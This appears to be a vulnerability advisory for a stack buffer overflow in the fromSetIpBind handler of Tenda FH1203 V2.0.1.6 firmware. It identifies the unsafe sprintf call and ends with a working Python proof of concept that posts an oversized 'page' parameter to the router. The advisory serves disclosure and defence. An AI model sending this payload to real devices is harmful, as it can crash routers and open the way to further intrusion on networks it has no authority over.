

# fromSetIpBind

## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2495.html

## Affected version

FH1203 V2.0.1.6

## Vulnerability details

There is a stack buffer overflow vulnerability in  FH1203 V2.0.1.6, located in the **fromSetIpBind** function. The function receives the `page` parameter from a POST request. ` sprintf(v8, "arp_bind.asp?page=%s", v2); ` The statement will cause a buffer overflow. The `page` value provided by the user may exceed the capacity of the `v8` array, thereby triggering this security vulnerability.


![image](https://github.com/user-attachments/assets/c5882cbd-1911-4357-9c7c-733c660609e3)

## POC

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/fromSetIpBind"
payload = b"a"*2000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image](https://github.com/user-attachments/assets/95ed87bd-a5ab-414d-95e9-fcc9e6b0176a)
